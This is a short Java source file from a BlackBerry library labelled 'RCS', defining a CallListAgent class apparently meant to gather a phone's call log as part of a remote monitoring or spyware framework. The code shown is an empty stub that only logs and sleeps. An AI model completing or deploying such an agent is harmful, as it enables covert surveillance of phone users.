/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : CallListAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CallListAgent extends Agent {
    private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);

    public CallListAgent(int AgentStatus) {
        super(Agent.AGENT_CALLLIST, AgentStatus, true);

    }

    protected CallListAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
    
    public void AgentRun() {
        debug.trace("run");

        this.SleepUntilStopped();

    }

}
